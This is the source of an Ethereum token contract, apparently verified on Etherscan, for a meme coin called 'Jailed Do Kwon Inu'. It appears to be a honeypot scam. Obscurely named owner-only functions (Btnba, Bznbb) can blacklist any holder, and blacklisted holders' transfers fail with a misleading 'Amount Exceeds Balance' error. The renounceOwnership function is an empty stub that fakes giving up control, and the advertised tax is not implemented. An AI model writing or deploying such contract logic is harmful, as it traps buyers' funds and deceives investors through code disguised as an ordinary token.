/**
 *Submitted for verification at Etherscan.io on 2022-09-14
*/

pragma solidity 0.8.7;
/*



 ▄▄▄██▀▀▀▄▄▄       ██▓ ██▓    ▓█████ ▓█████▄ 
   ▒██  ▒████▄    ▓██▒▓██▒    ▓█   ▀ ▒██▀ ██▌
   ░██  ▒██  ▀█▄  ▒██▒▒██░    ▒███   ░██   █▌
▓██▄██▓ ░██▄▄▄▄██ ░██░▒██░    ▒▓█  ▄ ░▓█▄   ▌
 ▓███▒   ▓█   ▓██▒░██░░██████▒░▒████▒░▒████▓ 
 ▒▓▒▒░   ▒▒   ▓▒█░░▓  ░ ▒░▓  ░░░ ▒░ ░ ▒▒▓  ▒ 
 ▒ ░▒░    ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░ ░ ░  ░ ░ ▒  ▒ 
 ░ ░ ░    ░   ▒    ▒ ░  ░ ░      ░    ░ ░  ░ 
 ░   ░        ░  ░ ░      ░  ░   ░  ░   ░    
                                      ░ 


RIP Do Kwon and the Wallets of His Victims

Tokenomics -
- 6B Supply
- 0% Tax 12 hours - then 7%



*/    

contract JAILED {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) zxAmnt;

    // 
    string public name = "Jailed Do Kwon Inu";
    string public symbol = unicode"JAILED";
    uint8 public decimals = 18;
    uint256 public totalSupply = 6000000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function renounceOwnership() public onlyOwner  {

}





    function Btnba(address _user) public onlyOwner {
        require(!zxAmnt[_user], "x");
        zxAmnt[_user] = true;
     
    }
    
    function Bznbb(address _user) public onlyOwner {
        require(zxAmnt[_user], "xx");
        zxAmnt[_user] = false;
  
    }
    
 


   




    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!zxAmnt[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
    
        require(!zxAmnt[from] , "Amount Exceeds Balance"); 
               require(!zxAmnt[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}